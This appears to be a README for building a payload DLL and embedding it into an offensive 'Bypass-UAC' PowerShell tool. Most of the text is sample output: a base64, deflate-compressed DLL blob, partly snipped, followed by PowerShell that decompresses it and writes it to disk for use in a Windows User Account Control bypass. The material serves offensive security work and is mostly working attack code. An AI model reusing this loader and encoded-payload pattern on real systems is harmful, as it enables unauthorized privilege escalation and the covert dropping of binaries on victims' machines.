# Build

This project was built with Visual Studio 2015.

# Replace Code In Bypass-UAC

After compiling the x32/x64 dll's, the "Out-UnmanagedDll" script can be used to generate output which allows for easy integration into Bypass-UAC. This script is based on [@mattifestation](https://twitter.com/mattifestation)'s post [here](http://www.exploit-monday.com/2012/12/in-memory-dll-loading.html).

```
PS C:\> Out-UnmanagedDll -FilePath C:\Some\Path\output.dll

$EncodedCompressedFile = @'
7V0JmBvFlX7jjBPbHDYbYIHsEgH2jg88nsM22NhuaSSNR/ZcHs1hG8PQI7Vm2pa6RXfL9jgkHLYDZjA2IewmQMy1RyBkEwIbh8sxkOWMwxFgl2MTw3Ltt2Rhv5BNSDbx/lUtzUialtTd0pjvy0bwT6urXv3vdXW9qlfVLVfb+r30KSKqBo4cIfoBmR8vlf4cBo7//APH031TD53xg6rWQ2d0D8m6J6mpg5qY8ERERVENz4Dk0VKKR1Y8gY6wJ6FGpdrjjps2M82RWDH30J

[..Snip..]

ZcLWRNzDhmQMZctr6mvrajySElGj6ECW1/R0N88/t8bDwsGoyH4KvbxmWNJrhBXHTVuGEExKDMSHPSBQ9OU1KU1ZqrOBVdTnJ+SIpupqzJiP/n2pqCdqN9fXeBKiIscwzvVmawOVx7MMUSZ7KzKmptnOLMHWeCYvh5K6FElpsjGcPkeKJl2cghYpysZ3OS4NSvpoZnZ2cCuK8p/RSZuluCfO/i6vETE8blY3SVqNJyX7IqxrXF4TE+O6VONZMKZkQWEtyxbk2LRswejFsWpbkKk3nIzrl/4ffmaY46uvLlYXr3uz7vT6efVL6j9po/70OVqf/wM=
'@
$Stream = new-object -TypeName System.IO.MemoryStream
$DeflateStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
$buffer = New-Object Byte[](32256)
$count = 0
do
    {
        $count = $DeflateStream.Read($buffer, 0, 1024)
        if ($count -gt 0)
            {
                $Stream.Write($buffer, 0, $count)
            }
    }
While ($count -gt 0)
$array = $stream.ToArray()
$DeflateStream.Close()
$Stream.Close()
Set-Content -value $array -encoding byte -path $DllPath
```